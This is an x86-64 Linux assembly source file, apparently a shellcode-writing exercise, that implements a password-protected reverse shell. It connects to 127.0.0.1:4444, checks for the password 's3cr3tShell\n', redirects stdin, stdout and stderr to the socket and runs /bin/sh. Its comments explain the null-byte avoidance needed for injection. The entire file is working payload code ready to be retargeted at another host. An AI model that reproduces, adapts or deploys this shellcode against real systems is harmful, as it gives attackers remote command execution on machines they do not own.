; Reverse shell that connects to 127.0.0.1:4444 and requires password "s3cr3tShell\n"

global _start

section .text

_start:

    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rcx,rcx
    xor rdx,rdx

    ;  // sycall socketcall (sys_socket 1)
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0);
    ; socket.AF_INET == 2
    ; socket.SOCK_STREAM == 1
    mov al, 41
    mov dil, 2
    mov sil, 1
    syscall

    mov rdi, rax ; store returned sockfd value to rdi

    ; server.sin_family = AF_INET;
    ; server.sin_port = htons(atoi(argv[1]));
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1");
    ; bzero(&server.sin_zero, 8);
    xor rax, rax
    push rax
    ; below can't be done with a direct move as there were too many null bytes
    ; mov dword [rsp-4], 0x0100007f; binascii.hexlify(socket.inet_aton("127.0.0.1")[::-1])
    push rax
    add byte [rsp+4], 0x7f
    inc byte [rsp+7]
    mov word [rsp+2], 0x5c11; hex(socket.htons(4444))
    mov byte [rsp], 2; AF_INET == 2

    ; syscall 42
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len);
    mov al, 42
    mov rsi, rsp
    mov dl, 16
    syscall

recv_string:

    ; syscall 45
    ; ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
    ;                  struct sockaddr *src_addr, socklen_t *addrlen);
    xor rax, rax
    mov al, 45

    ; Make space in stack for buffer
    sub rsp, 16
    mov rsi, rsp
    ; Length of buffer
    xor rdx, rdx
    mov dl, 16

    ; flags == 0
    xor r10, r10

    ; Push 16 null bytes onto stack for null sockaddr
    xor r8, r8
    push r8
    push r8
    mov r8, rsp
    
    xor r9,r9
    mov r9b, 16
    
    syscall


compare_string:
    ; Simple, sub 8 bytes comparison can be done like two lines below
    ; mov r9, 0x0a746572636573 ; secret
    ; xor [rsi], r9

    ; More complex comparison with bigger strings (16 bytes in this case) can be done like code below
    ; If you need to do bigger strings, make sure to change the buffer size on recv_string as well
    ; "s3cr3tShell\n"[::-1].encode('hex') == 0a6c6c656853743372633373
    mov byte [rsp-5], 0x0a
    mov byte [rsp-6], 0x6c
    mov byte [rsp-7], 0x6c
    mov byte [rsp-8], 0x65
    mov byte [rsp-9], 0x68
    mov byte [rsp-10], 0x53
    mov byte [rsp-11], 0x74
    mov byte [rsp-12], 0x33
    mov byte [rsp-13], 0x72
    mov byte [rsp-14], 0x63
    mov byte [rsp-15], 0x33
    mov byte [rsp-16], 0x73
    sub rsp, 16

    xor rbx,rbx ; loop counter
    xor rcx,rcx
    add cl, 16

compare_string_byte_by_byte:
    mov r8b, byte [rsp+rbx]
    xor byte [rsi+rbx], r8b
    jne end
    inc rbx
    loop compare_string_byte_by_byte

shell:
    ; // syscall 33
    ; dup2(resultfd, 2);
    ; dup2(resultfd, 1);
    ; dup2(resultfd, 0);
    xor rax, rax
    mov al, 33
    xor rsi, rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall

    ; // syscall 59
    ; execve("/bin/sh", NULL, NULL);
    xor rax, rax
    mov al, 59
    xor rbx,rbx
    push rbx
    mov  rcx, 0x68732f2f6e69622f ; "/bin//sh"[::-1].encode('hex')
    push rcx
    mov rdi, rsp

    push rbx
    mov rdx, rsp

    push rdi
    mov rsi, rsp
    syscall

end:
    ; close socket
    xor rax, rax
    mov al, 3
    syscall

    ; exit
    xor rax, rax
    mov al, 60
    syscall


